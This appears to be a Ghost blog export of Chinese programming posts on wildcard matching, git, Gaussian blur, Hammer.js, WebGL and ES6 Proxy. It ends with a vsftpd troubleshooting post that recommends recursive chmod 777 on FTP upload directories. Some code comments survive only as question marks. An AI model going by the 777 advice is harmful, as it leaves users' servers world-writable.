false\n\n\n题意：通配符匹配\n\n?表示：任意字符。*表示：0个或者n个? 先自己写。用的循环。\n\n        var isMatch = function(s, p) {\n            if(p==='*'){return true;}\n            var j=0;\n            var next;\n            var isXin=false;\n            var isSuccess=false;\n            var toI;\n            var toJ;\n            var begin;\n            for(var i=0;i<s.length;i++){\n                var charI= s.charAt(i);\n                var charJ= p.charAt(j)\n                if(charI===charJ||charJ==='?'){\n                    if(charI!=next&&next!==undefined&&next!='?'){\n                        toI=toI+1;\n                    }else{\n                        if(charI==next||next=='?'){\n                            begin=toI;\n                        }\n                    }\n                    j++;\n                    isSuccess=true;\n                    continue;\n                }else{\n                    if(charJ==='*'){\n                        isXin=true;\n                        var toJ=j;\n                        var toI=i;\n                        next= p.charAt(j+1)\n                        while(next==='*'){\n                            j++;\n                            next=p.charAt(j+1);\n                        }\n                        if(next==''){return true;}\n                        if(charI===next||next==='?'){\n                            isSuccess=true;\n                            j=j+2;\n                            begin=toI;\n                        }else{\n                            isSuccess=false;\n                        }\n                        continue;\n                    }\n\n                    if(isXin){\n                        if(isSuccess){\n                            j=toJ;\n                            i=toI;\n                            if(begin!=null){\n                                i=begin;\n                                begin=null;\n                            }\n                            isXin=false;\n                        }\n                    }else{\n                        return false;\n                    }\n                }\n            }\n            var str= p.slice(j, p.length)\n            if(str==''){return true;}\n            if(!!str.match(/^\\*+$/)&&isSuccess){return true}else{\n                return false;\n            }\n        };Runtime: 236 ms\n\n\n在网上看到一个C语言的版本，C语言还是快，11ms运行时间.\n\n\tbool isMatch(const char *s, const char *p) {\n\t\tconst char* star = NULL;\n\t\tconst char* ss = s;\n\t\twhile (*s) {\n\t\t\tif ((*p == '?') || (*p == *s)) { s++;p++;continue; }\n\t\t\tif (*p == '*') { star = p++; ss = s;continue; }\n\t\t\tif (star) { p = star + 1; s = ++ss;continue; }\n\t\t\treturn false;\n\t\t}\n\t\twhile (*p == '*') { p++; }\n\t\treturn !*p;\n\t}Runtime: 11 ms\n\n\n改成javascript，思想和自己写的差不多。\n\n        var isMatch = function(s, p) {\n            var i=0;var j=0;var k=0;var l=0;\n            var star;\n            var ss=s;\n            while (s.charAt(i)){\n                if ((p.charAt(j)=='?')||(p.charAt(j)==s.charAt(i))){i++;j++;continue;}\n                if (p.charAt(j)=='*'){\n                    star=p.slice(j, p.length);\n                    j++;\n                    ss= s.slice(i, s.length);\n                    k=0;l=0;continue;\n                }\n                if (star){\n                    p= star.slice(k+1,star.length);\n                    j=0;\n                    l++;\n                    s=ss.slice(l,ss.length);\n                    i=0;\n                    continue;            \n                }\n                return false;\n            }\n            while (p.charAt(j)=='*'){j++;}\n            return !p.charAt(j);\n        };Runtime: 264 ms \n\n\n第一个版本太乱了，虽然通过了。看了别人的解，这个题只需4个变量记录就可以了，修改如下：\n\n      var isMatch = function(s, p) {\n            var toI=-1        //保存 出现*时，i的值。要是s.charAt(toI)未匹配成功，则从下一位开始匹配(toI++;)，因为*可以为[0-n]个任意字符\n            var toJ=-1;       //保存 出现*时，j的值，用于*后面匹配不成功时，回溯。\n            var j=0;\n            for(var i=0;i< s.length;i++){\n                var CharI=s.charAt(i)\n                var CharJ=p.charAt(j)\n                if ((CharJ=='?')||(CharJ==CharI)){j++;continue;}\n                if (CharJ=='*'){\n                    toJ=j;\n                    j++;\n                    toI=i;\n                    i--;\n                    continue;\n                }\n                if (toJ>=0){\n                    toI++\n                    i=toI;\n                    i--;\n                    j=toJ;\n                    j++;\n                    continue;            //        p = star+1; s=++ss;continue;\n                }\n                return false;\n            }\n            while (p.charAt(j)=='*'){j++;} //p最后的*全不要。\n            return !p.charAt(j);    //j=p.lenght  P全部匹配完成。则return !\"\"\n        };Runtime: 256 ms","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-15T12:36:58.000Z","created_by":"1","updated_at":"2017-04-06T01:52:09.000Z","updated_by":"1","published_at":"2016-03-15T14:22:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d9","uuid":"b7061aec-701b-4fb1-ba44-2674c4df367d","title":"GitHub使用","slug":"githubshi-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"git add .  //????????????\\ngit commit -m 'commit'  //????????????\\ngit push -u origin master //??????\\n\\ngit fetch //???????????????\\ngit merge //??????\\n\\ngit commit -a --amend //????????????\\n\\n\\n git commit web/templates/index.html --amend  //??????????????????push??????\\n\\n\\n# Ant Design [![](https://img.shields.io/travis/ant-design/ant-design.svg?style=flat-square)](https://travis-ci.org/ant-design/ant-design) [![npm package](https://img.shields.io/npm/v/antd.svg?style=flat-square)](https://www.npmjs.org/package/antd) [![NPM downloads](http://img.shields.io/npm/dm/antd.svg?style=flat-square)](https://npmjs.org/package/antd) [![Dependency Status](https://david-dm.org/ant-design/ant-design.svg?style=flat-square)](https://david-dm.org/ant-design/ant-design) [![Join the chat at https://gitter.im/ant-design/ant-design](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/ant-design/ant-design?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>git add .  //????????????<br>\ngit commit -m 'commit'  //????????????<br>\ngit push -u origin master //??????</p>\n<p>git fetch //???????????????<br>\ngit merge //??????</p>\n<p>git commit -a --amend //????????????</p>\n<p>git commit web/templates/index.html --amend  //??????????????????push??????</p>\n<h1 id=\"antdesignnpmpackagenpmdownloadsdependencystatusjointhechatathttpsgitterimantdesignantdesign\">Ant Design <a href=\"https://travis-ci.org/ant-design/ant-design\"><img src=\"https://img.shields.io/travis/ant-design/ant-design.svg?style=flat-square\" alt=\"\"></a> <a href=\"https://www.npmjs.org/package/antd\"><img src=\"https://img.shields.io/npm/v/antd.svg?style=flat-square\" alt=\"npm package\"></a> <a href=\"https://npmjs.org/package/antd\"><img src=\"http://img.shields.io/npm/dm/antd.svg?style=flat-square\" alt=\"NPM downloads\"></a> <a href=\"https://david-dm.org/ant-design/ant-design\"><img src=\"https://david-dm.org/ant-design/ant-design.svg?style=flat-square\" alt=\"Dependency Status\"></a> <a href=\"https://gitter.im/ant-design/ant-design?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge\"><img src=\"https://badges.gitter.im/Join%20Chat.svg\" alt=\"Join the chat at https://gitter.im/ant-design/ant-design\"></a></h1>\n<!--kg-card-end: markdown-->","comment_id":"27","plaintext":"git add . //????????????\ngit commit -m 'commit' //????????????\ngit push -u origin master //??????\n\ngit fetch //???????????????\ngit merge //??????\n\ngit commit -a --amend //????????????\n\ngit commit web/templates/index.html --amend //??????????????????push??????\n\nAnt Design [https://travis-ci.org/ant-design/ant-design] \n[https://www.npmjs.org/package/antd] [https://npmjs.org/package/antd] \n[https://david-dm.org/ant-design/ant-design] \n[https://gitter.im/ant-design/ant-design?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge]","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-21T09:20:40.000Z","created_by":"1","updated_at":"2016-09-29T06:21:48.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2da","uuid":"97488715-e6fb-435a-88da-1623a0955f30","title":"高斯模糊","slug":"gao-si-mo-hu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n#####高斯模糊原理：\\n\\\"模糊\\\"，可以理解成每一个像素都取周边像素的平均值。\\n```\\n1   1   1     左边矩阵中，2是中间点，周边点都是1。\\\"中间点\\\"取\\\"周围点\\\"的平均值，就会变成1。  \\n1   2   1     在数值上，这是一种\\\"平滑化\\\"。在图形上，就相当于产生\\\"模糊\\\"效果，\\\"中间点\\\"失去细节。  \\n1   1   1     显然，计算平均值时，取值范围越大，\\\"模糊效果\\\"越强烈。  \\n```\\n\\n如果使用简单平均，显然不是很合理，因为图像都是连续的，越靠近的点关系越密切，越远离的点关系越疏远。因此，加权平均更合理，距离越近的点权重越大，距离越远的点权重越小。\\n######正态分布(高斯分布)的权重\\n二维高斯函数 \\n![](/content/images/2016/03/aec379310a55b319a9ad000b41a98226cffc1773.jpg)\\ne:当n→∞时,(1+1/n)^n的极限,自然对数的底数,是一个无限不循环小数,其值是2.71828... \\n下面是一个二维高斯函数3d模型（使用playcanvas引擎，建立的曲面）：\\n<iframe src=\\\"https://www.dadigua.win:8080/gaosi/\\\" height=\\\"600\\\" width=\\\"1000\\\"></iframe>\\n可见中间权重大，越到外面，约等于0;\\n<script>\\n\\t\\t  \\tvar loadImage=function(url,callback){\\n\\t\\t  \\t\\tif(callback===undefined){\\n\\t\\t  \\t\\t\\tcallback=function(){};\\n\\t\\t  \\t\\t}\\n           \\t\\t var img = new Image(); //????????????Image????????????????????????????????\\n            \\timg.src = url;\\n            \\tif (img.complete) { // ??????????????????????????????????????????????????????????????????\\n              \\t\\tcallback(img);\\n              \\t\\treturn;\\n            \\t}\\n            \\timg.onload = function () { //????????????????????????????????callback?????????\\n             \\t\\tcallback(img);\\n            \\t};\\n        \\t \\treturn img;\\n   \\t\\t\\t}\\nvar img=loadImage('/content/images/bg1.jpg')\\n</script>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h5 id=\"\">高斯模糊原理：</h5>\n<p>&quot;模糊&quot;，可以理解成每一个像素都取周边像素的平均值。</p>\n<pre><code>1   1   1     左边矩阵中，2是中间点，周边点都是1。&quot;中间点&quot;取&quot;周围点&quot;的平均值，就会变成1。  \n1   2   1     在数值上，这是一种&quot;平滑化&quot;。在图形上，就相当于产生&quot;模糊&quot;效果，&quot;中间点&quot;失去细节。  \n1   1   1     显然，计算平均值时，取值范围越大，&quot;模糊效果&quot;越强烈。  \n</code></pre>\n<p>如果使用简单平均，显然不是很合理，因为图像都是连续的，越靠近的点关系越密切，越远离的点关系越疏远。因此，加权平均更合理，距离越近的点权重越大，距离越远的点权重越小。</p>\n<h6 id=\"\">正态分布(高斯分布)的权重</h6>\n<p>二维高斯函数<br>\n<img src=\"/content/images/2016/03/aec379310a55b319a9ad000b41a98226cffc1773.jpg\" alt=\"\"><br>\ne:当n→∞时,(1+1/n)^n的极限,自然对数的底数,是一个无限不循环小数,其值是2.71828...<br>\n下面是一个二维高斯函数3d模型（使用playcanvas引擎，建立的曲面）：</p>\n<iframe src=\"https://www.dadigua.win:8080/gaosi/\" height=\"600\" width=\"1000\"></iframe>\n可见中间权重大，越到外面，约等于0;\n<script>\n\t\t  \tvar loadImage=function(url,callback){\n\t\t  \t\tif(callback===undefined){\n\t\t  \t\t\tcallback=function(){};\n\t\t  \t\t}\n           \t\t var img = new Image(); //????????????Image????????????????????????????????\n            \timg.src = url;\n            \tif (img.complete) { // ??????????????????????????????????????????????????????????????????\n              \t\tcallback(img);\n              \t\treturn;\n            \t}\n            \timg.onload = function () { //????????????????????????????????callback?????????\n             \t\tcallback(img);\n            \t};\n        \t \treturn img;\n   \t\t\t}\nvar img=loadImage('/content/images/bg1.jpg')\n</script><!--kg-card-end: markdown-->","comment_id":"28","plaintext":"高斯模糊原理：\n\"模糊\"，可以理解成每一个像素都取周边像素的平均值。\n\n1   1   1     左边矩阵中，2是中间点，周边点都是1。\"中间点\"取\"周围点\"的平均值，就会变成1。  \n1   2   1     在数值上，这是一种\"平滑化\"。在图形上，就相当于产生\"模糊\"效果，\"中间点\"失去细节。  \n1   1   1     显然，计算平均值时，取值范围越大，\"模糊效果\"越强烈。  \n\n\n如果使用简单平均，显然不是很合理，因为图像都是连续的，越靠近的点关系越密切，越远离的点关系越疏远。因此，加权平均更合理，距离越近的点权重越大，距离越远的点权重越小。\n\n正态分布(高斯分布)的权重\n二维高斯函数\n\ne:当n→∞时,(1+1/n)^n的极限,自然对数的底数,是一个无限不循环小数,其值是2.71828...\n下面是一个二维高斯函数3d模型（使用playcanvas引擎，建立的曲面）：\n\n可见中间权重大，越到外面，约等于0;","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-21T11:04:57.000Z","created_by":"1","updated_at":"2017-01-17T09:39:25.000Z","updated_by":"1","published_at":"2016-03-21T11:15:09.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2db","uuid":"3544a4df-b9e3-4d10-9a9d-7db35faa3652","title":"Hammer.js--移动端Web手势","slug":"hammer-js-yi-dong-duan-webshou-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Hammer.js是一个开源的，轻量级的javascript库，它可以在不需要依赖其他东西的情况下识别触摸，鼠标事件。\\n> API如下\\n<iframe src=\\\"http://www.dadigua.win:8080/show/phone/index.html\\\" style=\\\"width:100%;height:730px\\\">\\n</iframe>\\n默认设置下自动添加了，tap、press，pan与swipe的横向滑动。\\n\\npinch和rotate识别器在默认情况下都是禁用的,因为他们会有元素阻塞,但是我们可以手动开启：\\n```\\nhammertime.get('pinch').set({ enable: true });  \\nhammertime.get('rotate').set({ enable: true });  \\n```\\n当然，我们还可以为pan与swipe 开启纵向滑动\\n\\n```\\nhammertime.get('pan').set({ direction: Hammer.DIRECTION_ALL }); //全方向  \\nhammertime.get('swipe').set({ direction: Hammer.DIRECTION_VERTICAL }); //竖直方向  \\n```\\n我们能通过meta的标记，禁用doubletap/触控放大。但是新的浏览器支持touch-action属性所以可以不需要这个\\n\\n<meta name=\\\"viewport\\\" content=\\\"user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1\\\">\\n\\n还有一个[demo](http://www.dadigua.win:8080/show/phone/touch.html)。\\n\\n* 轻触变红\\n* 长触变绿\\n* 单指拖动\\n* 双指缩放，旋转(需要触屏设备)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Hammer.js是一个开源的，轻量级的javascript库，它可以在不需要依赖其他东西的情况下识别触摸，鼠标事件。</p>\n<blockquote>\n<p>API如下</p>\n</blockquote>\n<iframe src=\"http://www.dadigua.win:8080/show/phone/index.html\" style=\"width:100%;height:730px\">\n</iframe>\n默认设置下自动添加了，tap、press，pan与swipe的横向滑动。\n<p>pinch和rotate识别器在默认情况下都是禁用的,因为他们会有元素阻塞,但是我们可以手动开启：</p>\n<pre><code>hammertime.get('pinch').set({ enable: true });  \nhammertime.get('rotate').set({ enable: true });  \n</code></pre>\n<p>当然，我们还可以为pan与swipe 开启纵向滑动</p>\n<pre><code>hammertime.get('pan').set({ direction: Hammer.DIRECTION_ALL }); //全方向  \nhammertime.get('swipe').set({ direction: Hammer.DIRECTION_VERTICAL }); //竖直方向  \n</code></pre>\n<p>我们能通过meta的标记，禁用doubletap/触控放大。但是新的浏览器支持touch-action属性所以可以不需要这个</p>\n<meta name=\"viewport\" content=\"user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1\">\n<p>还有一个<a href=\"http://www.dadigua.win:8080/show/phone/touch.html\">demo</a>。</p>\n<ul>\n<li>轻触变红</li>\n<li>长触变绿</li>\n<li>单指拖动</li>\n<li>双指缩放，旋转(需要触屏设备)</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"30","plaintext":"Hammer.js是一个开源的，轻量级的javascript库，它可以在不需要依赖其他东西的情况下识别触摸，鼠标事件。\n\n> API如下\n\n\n默认设置下自动添加了，tap、press，pan与swipe的横向滑动。\npinch和rotate识别器在默认情况下都是禁用的,因为他们会有元素阻塞,但是我们可以手动开启：\n\nhammertime.get('pinch').set({ enable: true });  \nhammertime.get('rotate').set({ enable: true });  \n\n\n当然，我们还可以为pan与swipe 开启纵向滑动\n\nhammertime.get('pan').set({ direction: Hammer.DIRECTION_ALL }); //全方向  \nhammertime.get('swipe').set({ direction: Hammer.DIRECTION_VERTICAL }); //竖直方向  \n\n\n我们能通过meta的标记，禁用doubletap/触控放大。但是新的浏览器支持touch-action属性所以可以不需要这个\n\n还有一个demo [http://www.dadigua.win:8080/show/phone/touch.html]。\n\n * 轻触变红\n * 长触变绿\n * 单指拖动\n * 双指缩放，旋转(需要触屏设备)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-25T07:41:18.000Z","created_by":"1","updated_at":"2017-01-17T06:47:42.000Z","updated_by":"1","published_at":"2016-03-31T02:39:01.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2dc","uuid":"332e10eb-4e04-4174-8ebe-392f2bd68700","title":"webgl旗子","slug":"dong-tai-de-mesh","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<iframe src=\\\"https://www.dadigua.win:8080/show/Mesh/index.html\\\" height='600' width='1000'>\\n</iframe>\\n这是根据three.js中的一个例子改的。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><iframe src=\"https://www.dadigua.win:8080/show/Mesh/index.html\" height='600' width='1000'>\n</iframe>\n这是根据three.js中的一个例子改的。<!--kg-card-end: markdown-->","comment_id":"31","plaintext":"这是根据three.js中的一个例子改的。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-31T02:51:56.000Z","created_by":"1","updated_at":"2017-01-17T09:38:35.000Z","updated_by":"1","published_at":"2016-03-31T02:53:29.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2dd","uuid":"c5b0ea70-9fa8-40b1-aefc-5096bcfc2ca7","title":"3D--book","slug":"3d-book","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"webgl实现一个3d翻页效果。\\n\\n<img  height=\\\"300\\\" width=\\\"200\\\" src=\\\"/content/images/2016/04/book.jpg\\\">\\n\\n<iframe width=\\\"800\\\" height=\\\"1000\\\" src=\\\"https://www.dadigua.win:8080/show/book/book5.html\\\">\\n</iframe>\\n\\n这里使用measureText监测换行。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>webgl实现一个3d翻页效果。</p>\n<img  height=\"300\" width=\"200\" src=\"/content/images/2016/04/book.jpg\">\n<iframe width=\"800\" height=\"1000\" src=\"https://www.dadigua.win:8080/show/book/book5.html\">\n</iframe>\n<p>这里使用measureText监测换行。</p>\n<!--kg-card-end: markdown-->","comment_id":"32","plaintext":"webgl实现一个3d翻页效果。\n\n这里使用measureText监测换行。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-04T06:57:29.000Z","created_by":"1","updated_at":"2017-01-17T09:38:13.000Z","updated_by":"1","published_at":"2016-04-06T10:20:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2de","uuid":"19564763-e490-4a54-95de-dc5c5838c125","title":"ES6--Proxy","slug":"es6-proxy-dai-li","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Proxy 对象用来为基础操作（例如：属性查找、赋值、枚举、方法调用等）定义用户自定义行为。\\n\\n> 用法\\n\\nvar p = new Proxy(target, handler);\\n```\\nvar p = new Proxy({}, {  \\n    set: function(target, key, value, receiver) {\\n    console.log('method:set oldValue: '+target[key]+' newValue '+ value);\\n    target[key]=value;\\n    },\\n    get:function(target, key, receiver){\\n    console.log('method:get value '+target[key]);\\n    return target[key];\\n    },\\n    has:function(obj,key){\\n    return true;\\n    }\\n})\\n    p.name='123'  //调用set\\n        p.name  //调用set\\n        'aa' in p //调用has\\n```\\n\\n这里只举了`set,get,has`这三种常用trap的例子,其实还有其他十几种trap，可以在MDN上查。\\n\\n还有一种特殊的、针对函数的`apply`。\\n\\n```\\nvar p = new Proxy(function(){}, {  \\n  apply: function(target, thisArg, argumentsList) {\\n     console.log('apply',argumentsList)//argumentsList函数的参数\\n  }\\n});\\np('a','b')//执行apply  \\n```\\n利用这个可以写一些特殊函数，看起来很hack：\\n```\\n\\t   var restfulize=function(str){\\n        var temp=function(){}\\n        temp.path=str;\\n        return new Proxy(temp,{\\n        get:function(target, name){\\n             target.path+='/'+name;\\n             return restfulize(temp.path);\\n        },\\n        apply:function(target, that, args){\\n            return target.path\\n        }\\n       })\\n     }\\n\\n     var q= restfulize('https://api.github.com') \\n     q.name\\n     q.abc\\n    console.log(q.abc.qwe());//https://api.github.com/name/abc/abc/qwe\\n```\\n还可以加上一句`console.log(arguments.callee.caller)`，可以看到各种行为是被那个函数调用的。\\n```\\nvar p = new Proxy({}, {  \\n    set: function(target, key, value, receiver) {\\n         console.log(arguments.callee.caller)\\n    },\\n    get:function(target, key, receiver){\\n          console.log(arguments.callee.caller)\\n    }\\n})\\nfunction abc(){  \\np.name='99999';  \\n}\\nabc();  //输出abc函数=》在abc中，p被赋值了。用来调试，一下就是找到问题所在。\\n```\\n注意：如果在全局被调用则输出null;\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Proxy 对象用来为基础操作（例如：属性查找、赋值、枚举、方法调用等）定义用户自定义行为。</p>\n<blockquote>\n<p>用法</p>\n</blockquote>\n<p>var p = new Proxy(target, handler);</p>\n<pre><code>var p = new Proxy({}, {  \n    set: function(target, key, value, receiver) {\n    console.log('method:set oldValue: '+target[key]+' newValue '+ value);\n    target[key]=value;\n    },\n    get:function(target, key, receiver){\n    console.log('method:get value '+target[key]);\n    return target[key];\n    },\n    has:function(obj,key){\n    return true;\n    }\n})\n    p.name='123'  //调用set\n        p.name  //调用set\n        'aa' in p //调用has\n</code></pre>\n<p>这里只举了<code>set,get,has</code>这三种常用trap的例子,其实还有其他十几种trap，可以在MDN上查。</p>\n<p>还有一种特殊的、针对函数的<code>apply</code>。</p>\n<pre><code>var p = new Proxy(function(){}, {  \n  apply: function(target, thisArg, argumentsList) {\n     console.log('apply',argumentsList)//argumentsList函数的参数\n  }\n});\np('a','b')//执行apply  \n</code></pre>\n<p>利用这个可以写一些特殊函数，看起来很hack：</p>\n<pre><code>\t   var restfulize=function(str){\n        var temp=function(){}\n        temp.path=str;\n        return new Proxy(temp,{\n        get:function(target, name){\n             target.path+='/'+name;\n             return restfulize(temp.path);\n        },\n        apply:function(target, that, args){\n            return target.path\n        }\n       })\n     }\n\n     var q= restfulize('https://api.github.com') \n     q.name\n     q.abc\n    console.log(q.abc.qwe());//https://api.github.com/name/abc/abc/qwe\n</code></pre>\n<p>还可以加上一句<code>console.log(arguments.callee.caller)</code>，可以看到各种行为是被那个函数调用的。</p>\n<pre><code>var p = new Proxy({}, {  \n    set: function(target, key, value, receiver) {\n         console.log(arguments.callee.caller)\n    },\n    get:function(target, key, receiver){\n          console.log(arguments.callee.caller)\n    }\n})\nfunction abc(){  \np.name='99999';  \n}\nabc();  //输出abc函数=》在abc中，p被赋值了。用来调试，一下就是找到问题所在。\n</code></pre>\n<p>注意：如果在全局被调用则输出null;</p>\n<!--kg-card-end: markdown-->","comment_id":"33","plaintext":"Proxy 对象用来为基础操作（例如：属性查找、赋值、枚举、方法调用等）定义用户自定义行为。\n\n> 用法\n\n\nvar p = new Proxy(target, handler);\n\nvar p = new Proxy({}, {  \n    set: function(target, key, value, receiver) {\n    console.log('method:set oldValue: '+target[key]+' newValue '+ value);\n    target[key]=value;\n    },\n    get:function(target, key, receiver){\n    console.log('method:get value '+target[key]);\n    return target[key];\n    },\n    has:function(obj,key){\n    return true;\n    }\n})\n    p.name='123'  //调用set\n        p.name  //调用set\n        'aa' in p //调用has\n\n\n这里只举了set,get,has这三种常用trap的例子,其实还有其他十几种trap，可以在MDN上查。\n\n还有一种特殊的、针对函数的apply。\n\nvar p = new Proxy(function(){}, {  \n  apply: function(target, thisArg, argumentsList) {\n     console.log('apply',argumentsList)//argumentsList函数的参数\n  }\n});\np('a','b')//执行apply  \n\n\n利用这个可以写一些特殊函数，看起来很hack：\n\n\t   var restfulize=function(str){\n        var temp=function(){}\n        temp.path=str;\n        return new Proxy(temp,{\n        get:function(target, name){\n             target.path+='/'+name;\n             return restfulize(temp.path);\n        },\n        apply:function(target, that, args){\n            return target.path\n        }\n       })\n     }\n\n     var q= restfulize('https://api.github.com') \n     q.name\n     q.abc\n    console.log(q.abc.qwe());//https://api.github.com/name/abc/abc/qwe\n\n\n还可以加上一句console.log(arguments.callee.caller)，可以看到各种行为是被那个函数调用的。\n\nvar p = new Proxy({}, {  \n    set: function(target, key, value, receiver) {\n         console.log(arguments.callee.caller)\n    },\n    get:function(target, key, receiver){\n          console.log(arguments.callee.caller)\n    }\n})\nfunction abc(){  \np.name='99999';  \n}\nabc();  //输出abc函数=》在abc中，p被赋值了。用来调试，一下就是找到问题所在。\n\n\n注意：如果在全局被调用则输出null;","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-31T11:18:30.000Z","created_by":"1","updated_at":"2017-01-17T06:45:42.000Z","updated_by":"1","published_at":"2016-03-31T12:16:22.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2df","uuid":"78eaf00f-3018-45bc-b46f-a833b9382c56","title":"vsftpd--经验","slug":"vsftpd","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"根据[百度经验](http://jingyan.baidu.com/article/67508eb4d6c4fd9ccb1ce470.html)上面，可以连接上。但是，不能传文件。\\n\\n\\n* 550 Permission denied\\n \\n原因：vsftp默认配置不允许上传文件。\\n\\n解决：修改/etc/vsftpd.conf\\n\\n将“write_enable=YES”前面的#取消。\\n\\n重启vsftp服务器。\\n\\n* 553 Could not create file 复制文件到远端时错误。\\n\\n按照网上的做法，对/var/ftp目录进行权限设置，如果设置为chmod -R 777 /var/ftp\\n\\n还会导致ftp服务器不能启动，经过摸索，终于找到了解决的方法。\\n\\n首先在ftp的目录中创建一个目录，然后设置权限为777\\n\\n$sudo mkdir /var/ftp/write\\n\\n$sudo chmod -R 777 /var/ftp/write\\n\\n然后修改vsftp的配置文件/etc/vsftpd.conf文件的最后添加上\\n\\nlocal_root=/var/ftp\\n\\n保存，然后杀死vsftpd进程，然后重启vsftpd服务器程序。sudo service vsftpd restart（ubuntu）\\n\\n将文件上传到/var/ftp/write目录，这个时候可以正常的上传文件了。\\n\\n一句话，改权限。改了权限的路径才能上传文件。sudo chmod -R 777 url\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>根据<a href=\"http://jingyan.baidu.com/article/67508eb4d6c4fd9ccb1ce470.html\">百度经验</a>上面，可以连接上。但是，不能传文件。</p>\n<ul>\n<li>550 Permission denied</li>\n</ul>\n<p>原因：vsftp默认配置不允许上传文件。</p>\n<p>解决：修改/etc/vsftpd.conf</p>\n<p>将“write_enable=YES”前面的#取消。</p>\n<p>重启vsftp服务器。</p>\n<ul>\n<li>553 Could not create file 复制文件到远端时错误。</li>\n</ul>\n<p>按照网上的做法，对/var/ftp目录进行权限设置，如果设置为chmod -R 777 /var/ftp</p>\n<p>还会导致ftp服务器不能启动，经过摸索，终于找到了解决的方法。</p>\n<p>首先在ftp的目录中创建一个目录，然后设置权限为777</p>\n<p>$sudo mkdir /var/ftp/write</p>\n<p>$sudo chmod -R 777 /var/ftp/write</p>\n<p>然后修改vsftp的配置文件/etc/vsftpd.conf文件的最后添加上</p>\n<p>local_root=/var/ftp</p>\n<p>保存，然后杀死vsftpd进程，然后重启vsftpd服务器程序。sudo service vsftpd restart（ubuntu）</p>\n<p>将文件上传到/var/ftp/write目录，这个时候可以正常的上传文件了。</p>\n<p>一句话，改权限。改了权限的路径才能上传文件。sudo chmod -R 777 url</p>\n<!--kg-card-end: markdown-->","comment_id":"34","plaintext":"根据百度经验 [http://jingyan.baidu.com/article/67508eb4d6c4fd9ccb1ce470.html]\n上面，可以连接上。但是，不能传文件。\n\n * 550 Permission denied\n\n原因：vsftp默认配置不允许上传文件。\n\n解决：修改/etc/vsftpd.conf\n\n将“write_enable=YES”前面的#取消。\n\n重启vsftp服务器。\n\n * 553 Could not create file 复制文件到远端时错误。\n\n按照网上的做法，对/var/ftp目录进行权限设置，如果设置为chmod -R 777 /var/ftp\n\n还会导致ftp服务器不能启动，经过摸索，终于找到了解决的方法。\n\n首先在ftp的目录中创建一个目录，然后设置权限为777\n\n$sudo mkdir /var/ftp/write\n\n$sudo chmod -R 777 